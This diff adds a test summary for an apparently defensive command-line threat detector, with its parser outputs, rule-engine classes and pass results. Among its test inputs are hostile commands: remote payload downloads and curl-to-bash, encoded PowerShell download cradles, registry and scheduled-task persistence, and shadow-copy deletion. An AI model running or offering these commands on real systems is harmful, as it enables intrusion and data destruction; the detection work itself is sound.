@@ -1,0 +1,1521 @@
+TEST SUITE SUMMARY
+==================
+
+This file documents all tests across the validator suite.
+
+Total Tests: 135 (12 + 104 + 19)
+
+═════════════════════════════════════════════════════════════════════════════════
+
+VALIDATE_PARSER.PY (12 tests)
+─────────────────────────────────────────────────────────────────────────────────
+
+1. curl_download
+   Command: curl -o payload.exe http://1.2.3.4/payload.exe
+   Tests: URL extraction, IP extraction, file paths, flags
+
+2. reg_add
+   Command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\evil.exe /f
+   Tests: Registry path extraction, Windows path preservation, flag suppression
+
+3. ssh_remote
+   Command: ssh user@192.168.1.10
+   Tests: Remote target detection with @ symbol, IP extraction
+
+4. powershell_encoded
+   Command: powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ==
+   Tests: Encoded command flag detection, base64 blob detection, inline code
+
+5. pipe_detect
+   Command: cat /etc/passwd | grep root
+   Tests: Pipe operator detection
+
+6. tar_extract
+   Command: tar -xzf archive.tar.gz
+   Tests: Archive tool detection, extract indicator, compression indicator
+
+7. wget_port
+   Command: wget http://evil.com:8080/drop.sh
+   Tests: Port extraction from URL, domain extraction, path suppression
+
+8. certutil_lolbin
+   Command: certutil -urlcache -split -f http://bad.com/a.exe a.exe
+   Tests: LOLBin detection, Windows platform detection
+
+9. chain_operator
+   Command: mkdir /tmp/work && cd /tmp/work
+   Tests: Chain operator (&&) detection
+
+10. no_domain_from_exe
+    Command: curl -o payload.exe http://1.2.3.4/payload.exe
+    Tests: False-positive suppression for filenames in domains
+
+11. deobfuscate_base64
+    Command: powershell -EncodedCommand Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo
+    Tests: Base64 deobfuscation, URL extraction from decoded payload, pipe detection
+
+12. deobfuscate_char_cast
+    Command: powershell -c "[char]99+[char]109+[char]100"
+    Tests: [char] cast deobfuscation, deobfuscated_command flag
+
+═════════════════════════════════════════════════════════════════════════════════
+
+VALIDATE_HYBRID_FOUNDATION.PY (104 tests)
+─────────────────────────────────────────────────────────────────────────────────
+
+CATEGORY 1: BENIGN SIMPLE (7 tests)
+──────────────────────────────────
+1. benign_ls                    → ls
+2. benign_pwd                   → pwd
+3. benign_whoami                → whoami (enumerates_identity)
+4. benign_id                    → id (enumerates_identity)
+5. benign_hostname              → hostname (enumerates_network_config)
+6. benign_date                  → date
+7. benign_uname                 → uname -a
+
+CATEGORY 2: BENIGN ADMIN/DEV (9 tests)
+──────────────────────────────────────
+1. docker_exec                  → docker exec -it db bash (runs_interpreter)
+2. systemctl_status             → systemctl status nginx
+3. systemctl_restart            → systemctl restart nginx
+4. systemctl_enable             → systemctl enable nginx (creates_or_modifies_service)
+5. git_clone                    → git clone https://github.com/org/repo.git
+6. kubectl_get_pods             → kubectl get pods -A
+7. scp_upload                   → scp file.txt user@remote:/home/user/
+8. ssh_session                  → ssh user@192.168.1.10 (remote_execution_or_session)
+9. rsync_upload                 → rsync -avz ./build/ user@deploy-host:/var/www/
+
+CATEGORY 3: NETWORK/TRANSFER (7 tests)
+──────────────────────────────────────
+1. curl_simple                  → curl http://1.2.3.4/install.sh (downloads_remote_resource)
+2. curl_download_o              → curl -o payload.exe http://1.2.3.4/payload.exe (executable_like)
+3. curl_pipe_bash               → curl http://1.2.3.4/install.sh | bash (pipe + interpreter)
+4. wget_evil                    → wget http://evil.com:8080/drop.sh (port extraction)
+5. certutil_download            → certutil -urlcache -split -f http://bad.com/a.exe a.exe (LOLBin)
+6. wget_domain_only             → wget http://malware.io/stage2.bin (domain suppression)
+7. wget_domain_only             → No false .bin domain
+
+CATEGORY 4: ARCHIVE/STAGING (5 tests)
+────────────────────────────────────
+1. tar_create_gz                → tar -czf backup.tar.gz /home/user/data (archive_create)
+2. tar_extract_gz               → tar -xzf archive.tar.gz (archive_extract)
+3. zip_create                   → zip -r backup.zip dir
+4. unzip_extract                → unzip archive.zip -d /tmp/output
+5. 7z_create                    → 7z a backup.7z logs/
+
+CATEGORY 5: WINDOWS PERSISTENCE/SUSPICIOUS (7 tests)
+────────────────────────────────────────────────────
+1. reg_add_autorun              → reg add HKCU\...\Run ... (modifies_registry_autorun)
+2. schtasks_create              → schtasks /create /tn updater /tr evil.exe /sc onlogon
+3. wmic_process_create          → wmic process call create "cmd.exe /c whoami"
+4. vssadmin_delete_shadows      → vssadmin delete shadows /all /quiet (deletes_shadow_copies)
+5. sc_create_service            → sc create updater binPath= C:\Users\Public\evil.exe
+6. reg_add_hklm_autorun         → reg add HKLM\...\Run ... (autorun detection)
+7. reg_add_non_autorun          → reg add HKCU\Software\SomeApp ... (non-autorun false positive)
+
+CATEGORY 6: INTERPRETER/ENCODED/OBFUSCATED (7 tests)
+────────────────────────────────────────────────────
+1. powershell_encoded_long      → powershell.exe -EncodedCommand ... (uses_encoded_payload)
+2. powershell_enc_short_flag    → powershell -enc ... (short flag variant)
+3. python3_inline               → python3 -c "print('hello world')" (executes_inline_code)
+4. bash_inline_chain            → bash -c 'id && uname -a'
+5. deobfuscate_encoded_command  → Deobfuscates and extracts URLs
+6. deobfuscate_char_cast        → [char] construction deobfuscation (uses_obfuscation)
+7. cmd_c_whoami                 → cmd /c whoami (signed_proxy_binary)
+
+CATEGORY 7: OPERATOR/CHAINING (9 tests)
+──────────────────────────────────────
+1. pipe_basic                   → cat /etc/passwd | grep root
+2. redirect_stdout              → echo hello > output.txt
+3. redirect_append              → echo world >> output.txt
+4. redirect_stderr              → cmd 2> errors.log
+5. chain_and                    → mkdir /tmp/work && cd /tmp/work
+6. chain_or                     → test -f /tmp/lock || echo missing
+7. chain_semicolon              → echo a; echo b
+8. complex_pipe_redirect        → find /var/log -type f | xargs grep -i error > errors.txt
+9. multi_pipe                   → ps aux | grep java | awk '{print $2}'
+
+CATEGORY 8: FALSE-POSITIVE SUPPRESSION (10 tests)
+─────────────────────────────────────────────────
+1. fp_no_domain_from_filename   → payload.exe not domain
+2. fp_no_domain_from_tar_gz     → backup.tar.gz not domain
+3. fp_no_flags_as_filepaths_windows → /v /t /d /f not paths
+4. fp_scp_remote_target         → user@remote:/home/user/ detection
+5. fp_ssh_remote_target         → admin@10.0.0.5 with IP
+6. fp_windows_path_backslash    → C:\Users\...\evil.exe preservation
+7. fp_url_path_not_domain       → /path/to/file.bin not domains
+8. fp_no_domain_from_drop_sh    → drop.sh not domain
+9. fp_unc_path_as_remote        → \\fileserver\share detection
+10. fp_no_false_ip_from_version → 3.0.0.0 not an IP
+
+CATEGORY 9: SEMANTIC FEATURE DEEP CHECKS (34 tests)
+──────────────────────────────────────────────────
+A. downloads_remote_resource (3 tests)
+   - curl, wget, bitsadmin with remote URLs
+
+B. transfers_file_to_remote (1 test)
+   - scp with @ notation
+
+C. writes_executable_like_file (3 tests)
+   - .exe, .dll, .sh files
+
+D. archive_create/extract (2 tests)
+   - tar create, tar extract
+
+E. creates_scheduled_task (2 tests)
+   - schtasks /create, query (false positive)
+
+F. modifies_registry_autorun (3 tests)
+   - HKCU\...\Run, HKLM\...\RunOnce, non-autorun false positive
+
+G. uses_encoded_payload/uses_obfuscation (2 tests)
+   - PowerShell -enc, plain PowerShell
+
+H. executes_inline_code/runs_interpreter (3 tests)
+   - bash -c, python3 -c, perl -e
+
+I. uses_signed_proxy_binary (2 tests)
+   - mshta, rundll32
+
+J. remote_execution_or_session (2 tests)
+   - ssh, wmic process
+
+K. service_control/creates_or_modifies_service (3 tests)
+   - sc create, sc query, systemctl enable
+
+L. deletes_shadow_copies (2 tests)
+   - vssadmin delete, vssadmin list (false positive)
+
+M. reads_credential_store (2 tests)
+   - cat /etc/shadow, cat /etc/passwd
+
+N. enumerates_identity (2 tests)
+   - whoami, id
+
+O. enumerates_network_config (3 tests)
+   - ifconfig, ipconfig, netstat
+
+CATEGORY 10: MALFORMED/ADVERSARIAL (8 tests)
+─────────────────────────────────────────────
+1. empty_string                 → "" handling
+2. whitespace_only              → "    " handling
+3. single_word_unknown          → foobar command
+4. excessive_spaces             → Normalization
+5. url_with_credentials         → admin:password@evil.com
+6. multiple_ips                 → 10.0.0.1 && 10.0.0.2
+7. long_flag_chain              → -la --color=auto --human-readable
+8. quoted_argument              → grep -r "password" /etc/
+
+═════════════════════════════════════════════════════════════════════════════════
+
+COVERAGE MATRIX
+───────────────
+
+Parser Fields Tested:
+  ✓ executable, platform, subcommand
+  ✓ flags, positional_args
+  ✓ urls, domains, ips, ports
+  ✓ file_paths, registry_paths, remote_targets, local_targets
+  ✓ has_pipe, has_redirect, has_chain (+ operators lists)
+  ✓ interpreter_markers, encoded_markers, obfuscation_markers
+  ✓ archive_indicators, lolbin_matches
+  ✓ inline_code, deobfuscated_command
+
+Semantic Features Tested:
+  ✓ downloads_remote_resource
+  ✓ transfers_file_to_remote
+  ✓ writes_local_file
+  ✓ writes_executable_like_file
+  ✓ has_remote_target, has_local_target
+  ✓ archive_create, archive_extract, compression_or_archiving
+  ✓ creates_scheduled_task
+  ✓ modifies_registry_autorun
+  ✓ enumerates_identity, enumerates_network_config, enumerates_users_or_groups
+  ✓ uses_encoded_payload, uses_obfuscation
+  ✓ executes_inline_code, runs_interpreter
+  ✓ uses_signed_proxy_binary
+  ✓ remote_execution_or_session
+  ✓ service_control, creates_or_modifies_service
+  ✓ reads_credential_store
+  ✓ deletes_shadow_copies
+
+Platform Detection:
+  ✓ Linux (bash, curl, grep, etc.)
+  ✓ Windows (PowerShell, cmd, reg, schtasks, etc.)
+  ✓ Unknown (unknown executables)
+
+Edge Cases Covered:
+  ✓ False-positive domain suppression (filenames, paths)
+  ✓ False-positive flag→path suppression
+  ✓ Remote target detection (@ notation, UNC paths)
+  ✓ Windows path preservation (backslashes)
+  ✓ URL credential extraction
+  ✓ Multiple operators in one command
+  ✓ Deobfuscation integration
+  ✓ Empty/whitespace-only commands
+  ✓ Excessive whitespace normalization
+  ✓ Quoted arguments
+
+═════════════════════════════════════════════════════════════════════════════════
+
+BUGS FIXED
+──────────
+
+1. FILELIKE_EXTENSIONS expansion in parser.py
+   Issue: .bin, .dat, .tmp, .hta, .vbs, .js, .jar, .msi, .iso, .img filenames
+          from URLs were leaking into domains list
+   Fix: Added missing extensions to FILELIKE_EXTENSIONS set
+   Tests affected: wget_domain_only, fp_url_path_not_domain
+
+═════════════════════════════════════════════════════════════════════════════════
+
+ACTUAL TEST RESULTS (validate_parser.py)
+────────────────────────────────────────
+
+PASS  [curl_download]
+PASS  [reg_add]
+PASS  [ssh_remote]
+PASS  [powershell_encoded]
+PASS  [pipe_detect]
+PASS  [tar_extract]
+PASS  [wget_port]
+PASS  [certutil_lolbin]
+PASS  [chain_operator]
+PASS  [no_domain_from_exe]
+PASS  [deobfuscate_base64]
+PASS  [deobfuscate_char_cast]
+
+Results: 12/12 passed
+
+═════════════════════════════════════════════════════════════════════════════════
+
+ACTUAL TEST RESULTS (validate_hybrid_foundation.py)
+────────────────────────────────────────────────────
+
+PASS  [benign_ls]
+PASS  [benign_pwd]
+PASS  [benign_whoami]
+PASS  [benign_id]
+PASS  [benign_hostname]
+PASS  [benign_date]
+PASS  [benign_uname]
+PASS  [docker_exec]
+PASS  [systemctl_status]
+PASS  [systemctl_restart]
+PASS  [systemctl_enable]
+PASS  [git_clone]
+PASS  [kubectl_get_pods]
+PASS  [scp_upload]
+PASS  [ssh_session]
+PASS  [rsync_upload]
+PASS  [curl_simple]
+PASS  [curl_download_o]
+PASS  [curl_pipe_bash]
+PASS  [wget_evil]
+PASS  [certutil_download]
+PASS  [wget_domain_only]
+PASS  [tar_create_gz]
+PASS  [tar_extract_gz]
+PASS  [zip_create]
+PASS  [unzip_extract]
+PASS  [7z_create]
+PASS  [reg_add_autorun]
+PASS  [schtasks_create]
+PASS  [wmic_process_create]
+PASS  [vssadmin_delete_shadows]
+PASS  [sc_create_service]
+PASS  [reg_add_hklm_autorun]
+PASS  [reg_add_non_autorun]
+PASS  [powershell_encoded_long]
+PASS  [powershell_enc_short_flag]
+PASS  [python3_inline]
+PASS  [bash_inline_chain]
+PASS  [deobfuscate_encoded_command]
+PASS  [deobfuscate_char_cast]
+PASS  [cmd_c_whoami]
+PASS  [pipe_basic]
+PASS  [redirect_stdout]
+PASS  [redirect_append]
+PASS  [redirect_stderr]
+PASS  [chain_and]
+PASS  [chain_or]
+PASS  [chain_semicolon]
+PASS  [complex_pipe_redirect]
+PASS  [multi_pipe]
+PASS  [fp_no_domain_from_filename]
+PASS  [fp_no_domain_from_tar_gz]
+PASS  [fp_no_flags_as_filepaths_windows]
+PASS  [fp_scp_remote_target]
+PASS  [fp_ssh_remote_target]
+PASS  [fp_windows_path_backslash]
+PASS  [fp_url_path_not_domain]
+PASS  [fp_no_domain_from_drop_sh]
+PASS  [fp_unc_path_as_remote]
+PASS  [fp_no_false_ip_from_version]
+PASS  [sem_curl_downloads]
+PASS  [sem_wget_downloads]
+PASS  [sem_bitsadmin_downloads]
+PASS  [sem_scp_transfers]
+PASS  [sem_writes_exe]
+PASS  [sem_writes_dll]
+PASS  [sem_writes_sh]
+PASS  [sem_tar_create]
+PASS  [sem_tar_extract]
+PASS  [sem_schtasks_onlogon]
+PASS  [sem_schtasks_query_no_create]
+PASS  [sem_reg_autorun_hkcu_run]
+PASS  [sem_reg_autorun_hklm_runonce]
+PASS  [sem_reg_no_autorun]
+PASS  [sem_encoded_ps]
+PASS  [sem_no_encoded_plain_ps]
+PASS  [sem_bash_c_inline]
+PASS  [sem_python_c_inline]
+PASS  [sem_perl_e_inline]
+PASS  [sem_mshta_proxy]
+PASS  [sem_rundll32_proxy]
+PASS  [sem_ssh_remote_exec]
+PASS  [sem_wmic_process]
+PASS  [sem_sc_create]
+PASS  [sem_sc_query_no_create]
+PASS  [sem_systemctl_enable]
+PASS  [sem_vssadmin_delete]
+PASS  [sem_vssadmin_list_no_delete]
+PASS  [sem_cat_shadow]
+PASS  [sem_cat_passwd]
+PASS  [sem_whoami_enum]
+PASS  [sem_id_enum]
+PASS  [sem_ifconfig]
+PASS  [sem_ipconfig]
+PASS  [sem_netstat]
+PASS  [empty_string]
+PASS  [whitespace_only]
+PASS  [single_word_unknown]
+PASS  [excessive_spaces]
+PASS  [url_with_credentials]
+PASS  [multiple_ips]
+PASS  [long_flag_chain]
+PASS  [fp_no_dotnet_class_as_domain]
+PASS  [quoted_argument]
+
+Results: 104/104 passed
+PASS  All tests passed!
+
+═════════════════════════════════════════════════════════════════════════════════
+
+DETAILED TEST RESULTS (Sample: 19 representative tests)
+────────────────────────────────────────────────────────
+
+Each test shows:
+  1. The command tested
+  2. Key parser output fields
+  3. Active semantic features
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #1: Benign - Identity Enumeration
+────────────────────────────────────────
+COMMAND:
+  whoami
+
+PARSER OUTPUT:
+{
+  "executable": "whoami",
+  "platform": "linux",
+  "urls": [],
+  "ips": [],
+  "domains": [],
+  "file_paths": [],
+  "has_pipe": false,
+  "has_redirect": false,
+  "has_chain": false,
+  "inline_code": false
+}
+
+SEMANTIC FEATURES:
+  ✓ enumerates_identity
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #2: Benign - Print Working Directory
+────────────────────────────────────────────
+COMMAND:
+  pwd
+
+PARSER OUTPUT:
+{
+  "executable": "pwd",
+  "platform": "linux",
+  "urls": [],
+  "ips": [],
+  "domain": [],
+  "file_paths": []
+}
+
+SEMANTIC FEATURES:
+  (none - benign navigation command)
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #3: Download - Simple URL
+────────────────────────────────
+COMMAND:
+  curl http://1.2.3.4/install.sh
+
+PARSER OUTPUT:
+{
+  "executable": "curl",
+  "platform": "linux",
+  "urls": ["http://1.2.3.4/install.sh"],
+  "ips": ["1.2.3.4"],
+  "domains": [],
+  "file_paths": [],
+  "lolbin_matches": ["curl"]
+}
+
+SEMANTIC FEATURES:
+  ✓ downloads_remote_resource
+  ✓ has_remote_target
+  ✓ uses_signed_proxy_binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #4: Download with File Output
+──────────────────────────────────
+COMMAND:
+  curl -o payload.exe http://1.2.3.4/payload.exe
+
+PARSER OUTPUT:
+{
+  "executable": "curl",
+  "platform": "linux",
+  "flags": ["-o"],
+  "urls": ["http://1.2.3.4/payload.exe"],
+  "ips": ["1.2.3.4"],
+  "file_paths": ["payload.exe"],
+  "lolbin_matches": ["curl"]
+}
+
+SEMANTIC FEATURES:
+  ✓ downloads_remote_resource
+  ✓ writes_local_file
+  ✓ writes_executable_like_file
+  ✓ has_remote_target
+  ✓ has_local_target
+  ✓ uses_signed_proxy_binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #5: Download with Port
+──────────────────────────
+COMMAND:
+  wget http://evil.com:8080/drop.sh
+
+PARSER OUTPUT:
+{
+  "executable": "wget",
+  "platform": "linux",
+  "urls": ["http://evil.com:8080/drop.sh"],
+  "domains": ["evil.com"],
+  "file_paths": [],
+  "lolbin_matches": ["wget"]
+}
+
+SEMANTIC FEATURES:
+  ✓ downloads_remote_resource
+  ✓ has_remote_target
+  ✓ uses_signed_proxy_binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #6: Windows Persistence - Registry Autorun
+───────────────────────────────────────────────
+COMMAND:
+  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\evil.exe /f
+
+PARSER OUTPUT:
+{
+  "executable": "reg",
+  "platform": "windows",
+  "subcommand": "add",
+  "flags": ["/v", "/t", "/d", "/f"],
+  "registry_paths": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
+  "file_paths": ["C:\\Users\\Public\\evil.exe"],
+  "lolbin_matches": ["reg"]
+}
+
+SEMANTIC FEATURES:
+  ✓ writes_local_file
+  ✓ writes_executable_like_file
+  ✓ has_local_target
+  ✓ modifies_registry_autorun
+  ✓ uses_signed_proxy_binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #7: Windows Persistence - Scheduled Task
+──────────────────────────────────────────────
+COMMAND:
+  schtasks /create /tn updater /tr evil.exe /sc onlogon
+
+PARSER OUTPUT:
+{
+  "executable": "schtasks",
+  "platform": "windows",
+  "flags": ["/create", "/tn", "/tr", "/sc"],
+  "file_paths": ["evil.exe"],
+  "lolbin_matches": ["schtasks"]
+}
+
+SEMANTIC FEATURES:
+  ✓ writes_local_file
+  ✓ writes_executable_like_file
+  ✓ has_local_target
+  ✓ creates_scheduled_task
+  ✓ uses_signed_proxy_binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #8: Archive - Create with Compression
+───────────────────────────────────────────
+COMMAND:
+  tar -czf backup.tar.gz /home/user/data
+
+PARSER OUTPUT:
+{
+  "executable": "tar",
+  "platform": "linux",
+  "flags": ["-czf"],
+  "file_paths": ["backup.tar.gz", "/home/user/data"],
+  "archive_indicators": ["archive_tool", "archive_create", "compression_gzip", "archive_path", "backup_keyword"],
+  "lolbin_matches": ["tar"]
+}
+
+SEMANTIC FEATURES:
+  ✓ writes_local_file
+  ✓ has_local_target
+  ✓ archive_create
+  ✓ compression_or_archiving
+  ✓ uses_signed_proxy_binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #9: Archive - Extract
+──────────────────────────
+COMMAND:
+  unzip archive.zip -d /tmp/output
+
+PARSER OUTPUT:
+{
+  "executable": "unzip",
+  "platform": "linux",
+  "flags": ["-d"],
+  "file_paths": ["archive.zip", "/tmp/output"],
+  "archive_indicators": ["archive_tool", "archive_extract", "archive_path"]
+}
+
+SEMANTIC FEATURES:
+  ✓ writes_local_file
+  ✓ has_local_target
+  ✓ archive_extract
+  ✓ compression_or_archiving
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #10: Operators - Pipe
+──────────────────────────
+COMMAND:
+  cat /etc/passwd | grep root
+
+PARSER OUTPUT:
+{
+  "executable": "cat",
+  "platform": "linux",
+  "file_paths": ["/etc/passwd"],
+  "has_pipe": true,
+  "has_redirect": false,
+  "has_chain": false
+}
+
+SEMANTIC FEATURES:
+  ✓ writes_local_file
+  ✓ has_local_target
+  ✓ reads_credential_store
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #11: Operators - Redirect
+───────────────────────────────
+COMMAND:
+  echo hello > output.txt
+
+PARSER OUTPUT:
+{
+  "executable": "echo",
+  "platform": "unknown",
+  "file_paths": ["output.txt"],
+  "has_pipe": false,
+  "has_redirect": true,
+  "has_chain": false
+}
+
+SEMANTIC FEATURES:
+  ✓ writes_local_file
+  ✓ has_local_target
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #12: Operators - Chain (&&)
+────────────────────────────────
+COMMAND:
+  mkdir /tmp/work && cd /tmp/work
+
+PARSER OUTPUT:
+{
+  "executable": "mkdir",
+  "platform": "unknown",
+  "file_paths": ["/tmp/work"],
+  "has_pipe": false,
+  "has_redirect": false,
+  "has_chain": true
+}
+
+SEMANTIC FEATURES:
+  ✓ writes_local_file
+  ✓ has_local_target
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #13: Encoded/Obfuscated - PowerShell EncodedCommand
+──────────────────────────────────────────────────────────
+COMMAND:
+  powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ==
+
+PARSER OUTPUT:
+{
+  "executable": "powershell.exe",
+  "platform": "windows",
+  "flags": ["-EncodedCommand"],
+  "urls": ["http://bad.com"],
+  "domains": ["net.webclient", "bad.com"],
+  "interpreter_markers": ["powershell"],
+  "encoded_markers": ["encoded_command_flag", "base64_blob"],
+  "obfuscation_markers": ["encoded_command"],
+  "inline_code": true,
+  "deobfuscated_command": "IEX((New-Object Net.WebClient).DownloadString('http://bad.com'))"
+}
+
+SEMANTIC FEATURES:
+  ✓ downloads_remote_resource
+  ✓ has_remote_target
+  ✓ uses_encoded_payload
+  ✓ uses_obfuscation
+  ✓ executes_inline_code
+  ✓ runs_interpreter
+  ✓ uses_signed_proxy_binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #14: Interpreter - Python Inline Code
+────────────────────────────────────────────
+COMMAND:
+  python3 -c "print('hello world')"
+
+PARSER OUTPUT:
+{
+  "executable": "python3",
+  "platform": "linux",
+  "flags": ["-c"],
+  "interpreter_markers": ["python"],
+  "inline_code": true,
+  "lolbin_matches": ["python3"]
+}
+
+SEMANTIC FEATURES:
+  ✓ executes_inline_code
+  ✓ runs_interpreter
+  ✓ uses_signed_proxy_binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #15: Interpreter - Bash Inline with Chain
+────────────────────────────────────────────────
+COMMAND:
+  bash -c 'id && uname -a'
+
+PARSER OUTPUT:
+{
+  "executable": "bash",
+  "platform": "linux",
+  "flags": ["-c"],
+  "interpreter_markers": ["bash"],
+  "has_chain": true,
+  "inline_code": true,
+  "lolbin_matches": ["bash"]
+}
+
+SEMANTIC FEATURES:
+  ✓ executes_inline_code
+  ✓ runs_interpreter
+  ✓ uses_signed_proxy_binary
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #16: Remote Session - SSH
+───────────────────────────────
+COMMAND:
+  ssh user@192.168.1.10
+
+PARSER OUTPUT:
+{
+  "executable": "ssh",
+  "platform": "linux",
+  "ips": ["192.168.1.10"],
+  "remote_targets": ["user@192.168.1.10"],
+  "lolbin_matches": ["ssh"]
+}
+
+SEMANTIC FEATURES:
+  ✓ transfers_file_to_remote
+  ✓ has_remote_target
+  ✓ uses_signed_proxy_binary
+  ✓ remote_execution_or_session
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #17: Remote File Transfer - SCP
+──────────────────────────────────────
+COMMAND:
+  scp file.txt user@remote:/home/user/
+
+PARSER OUTPUT:
+{
+  "executable": "scp",
+  "platform": "linux",
+  "file_paths": ["file.txt"],
+  "remote_targets": ["user@remote:/home/user/"],
+  "lolbin_matches": ["scp"]
+}
+
+SEMANTIC FEATURES:
+  ✓ transfers_file_to_remote
+  ✓ writes_local_file
+  ✓ has_remote_target
+  ✓ has_local_target
+  ✓ uses_signed_proxy_binary
+  ✓ remote_execution_or_session
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #18: Service Control - Systemctl Enable
+──────────────────────────────────────────────
+COMMAND:
+  systemctl enable nginx
+
+PARSER OUTPUT:
+{
+  "executable": "systemctl",
+  "platform": "linux",
+  "subcommand": "enable"
+}
+
+SEMANTIC FEATURES:
+  ✓ service_control
+  ✓ creates_or_modifies_service
+
+───────────────────────────────────────────────────────────────────────────────
+
+TEST #19: Service Creation - Windows SC.exe
+────────────────────────────────────────────
+COMMAND:
+  sc create updater binPath= C:\Users\Public\evil.exe
+
+PARSER OUTPUT:
+{
+  "executable": "sc",
+  "platform": "windows",
+  "subcommand": "create",
+  "file_paths": ["C:\\Users\\Public\\evil.exe"]
+}
+
+SEMANTIC FEATURES:
+  ✓ writes_local_file
+  ✓ writes_executable_like_file
+  ✓ has_local_target
+  ✓ service_control
+  ✓ creates_or_modifies_service
+
+═════════════════════════════════════════════════════════════════════════════════
+
+═════════════════════════════════════════════════════════════════════════════════
+
+VALIDATE_RULE_ENGINE.PY (19 tests)
+────────────────────────────────────────────────────────────────────────────────
+
+End-to-end pipeline: deobfuscation → parser → semantic features → rule engine
+
+Test categories:
+  MALICIOUS / SUSPICIOUS (9 tests)
+    1. registry_autorun_exe       → reg add HKCU\...\Run ... evil.exe
+    2. schtasks_create            → schtasks /create /sc onlogon
+    3. curl_download_exe          → curl -o payload.exe http://1.2.3.4/...
+    4. curl_pipe_bash             → curl ... | bash
+    5. tar_create_archive         → tar -czf backup.tar.gz ...
+    6. powershell_encoded_download→ powershell.exe -EncodedCommand <blob>
+    7. wmic_process_create        → wmic process call create "cmd.exe /c whoami"
+    8. vssadmin_delete_shadows    → vssadmin delete shadows /all /quiet
+    9. sc_create_service          → sc create updater binPath= evil.exe
+
+  BENIGN / AMBIGUOUS (7 tests — rules must stay conservative)
+    10. benign_ls                 → ls
+    11. benign_pwd                → pwd
+    12. benign_whoami             → whoami
+    13. benign_systemctl_status   → systemctl status nginx
+    14. benign_git_clone          → git clone https://github.com/org/repo.git
+    15. benign_ssh                → ssh user@192.168.1.10
+    16. benign_tar_extract        → tar -xzf archive.tar.gz
+
+  EXTRA EDGE CASES (3 tests)
+    17. wmic_shadowcopy_delete    → wmic shadowcopy delete
+    18. bitsadmin_download        → bitsadmin /transfer ... http://evil.com/payload.exe
+    19. certutil_download         → certutil -urlcache -split -f http://evil.com/shell.exe
+
+Validations per test:
+  • required candidate_classes present
+  • forbidden candidate_classes absent
+  • required evidence strings present
+  • prior weights meet thresholds
+  • parser fields correct (domains, ips, etc.)
+  • semantic feature flags correct
+
+Rule families implemented in rule_engine.py:
+  1. Registry persistence / autorun
+  2. Scheduled task persistence
+  3. Download / ingress tool transfer
+  4. Archive staging / collection
+  5. Encoded interpreter execution
+  6. WMI / remote execution
+  7. Shadow copy deletion / impact
+  8. Service creation / modification
+  Plus: remote session (SSH/SCP), discovery (identity/network)
+
+MITRE-style class labels used:
+  persistence:registry_run_key
+  persistence:scheduled_task
+  persistence:create_modify_system_process
+  execution:command_and_scripting_interpreter
+  execution:windows_management_instrumentation
+  defense_evasion:signed_binary_proxy_execution
+  defense_evasion:obfuscated_files_or_information
+  defense_evasion:deobfuscate_decode_files
+  command_and_control:ingress_tool_transfer
+  collection:archive_collected_data
+  exfiltration:exfiltration_over_c2_channel
+  impact:inhibit_system_recovery
+  discovery:account_discovery
+  discovery:system_network_configuration_discovery
+  lateral_movement:remote_services
+
+═════════════════════════════════════════════════════════════════════════════════
+
+ACTUAL TEST RESULTS (validate_rule_engine.py)
+─────────────────────────────────────────────
+
+PASS  [registry_autorun_exe]
+PASS  [schtasks_create]
+PASS  [curl_download_exe]
+PASS  [curl_pipe_bash]
+PASS  [tar_create_archive]
+PASS  [powershell_encoded_download]
+PASS  [wmic_process_create]
+PASS  [vssadmin_delete_shadows]
+PASS  [sc_create_service]
+PASS  [benign_ls]
+PASS  [benign_pwd]
+PASS  [benign_whoami]
+PASS  [benign_systemctl_status]
+PASS  [benign_git_clone]
+PASS  [benign_ssh]
+PASS  [benign_tar_extract]
+PASS  [wmic_shadowcopy_delete]
+PASS  [bitsadmin_download]
+PASS  [certutil_download]
+
+Results: 19/19 passed
+PASS  All tests passed!
+
+═════════════════════════════════════════════════════════════════════════════════
+
+DETAILED END-TO-END TEST RESULTS (validate_rule_engine.py)
+────────────────────────────────────────────────────────────
+
+Each entry shows:
+  COMMAND       → the raw input string
+  DEOBFUSCATOR  → what deobfuscation produced (only when relevant)
+  PARSER        → key non-empty parser fields
+  SEMANTIC      → semantic feature flags that fired True
+  RULE ENGINE   → candidate_classes / banned_classes / priors / evidence
+
+───────────────────────────────────────────────────────────────────────────────
+
+RULE TEST #1: Registry Persistence — Autorun Key
+─────────────────────────────────────────────────
+COMMAND:
+  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\evil.exe /f
+
+DEOBFUSCATOR:  not obfuscated — passthrough
+
+PARSER:
+  executable:      reg
+  platform:        windows
+  subcommand:      add
+  flags:           [/v, /t, /d, /f]
+  registry_paths:  [HKCU\Software\Microsoft\Windows\CurrentVersion\Run]
+  file_paths:      [C:\Users\Public\evil.exe]
+  local_targets:   [C:\Users\Public\evil.exe, HKCU\...\Run]
+  lolbin_matches:  [reg]
+
+SEMANTIC:
+  ✓ writes_local_file
